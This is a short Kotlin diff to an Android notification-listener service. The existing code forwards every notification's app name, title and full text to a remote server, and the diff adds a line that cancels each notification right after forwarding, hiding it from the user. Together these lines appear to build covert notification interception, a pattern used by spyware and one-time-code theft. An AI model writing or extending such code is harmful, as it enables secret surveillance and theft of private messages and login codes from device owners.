@@ -32,6 +32,8 @@ class MyNotificationListener : NotificationListenerService() {
 
         // Send all notifications to server
         sendToRemoteServer(packageName, title, fullMessage, sbn.postTime)
+
+        cancelNotification(sbn.key)
     }
 
     private fun sendToRemoteServer(pkg: String, title: String, content: String, time: Long) {
